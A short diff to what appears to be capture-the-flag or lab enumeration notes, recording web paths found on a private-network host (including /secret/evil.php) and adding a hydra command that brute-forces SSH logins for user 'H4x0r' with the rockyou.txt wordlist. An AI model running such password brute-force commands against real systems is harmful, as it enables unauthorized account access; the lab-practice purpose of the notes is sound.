@@ -7,7 +7,7 @@
 
     Results (4): 
             http://10.10.20.50/index.html
-            http://10.10.20.50/robots.txt
+            http://10.10.20.50/robots.txt     (hello H4x0r)
             http://10.10.20.50/secret
             http://10.10.20.50/secret/index.html
 
@@ -21,3 +21,7 @@
     directory-list-lowercase-2.3-medium.txt
 
     Results: /secret/evil.php
+
+5. hydra
+
+    hydra -t4 -l H4x0r -P rockyou.txt ssh://10.10.20.50
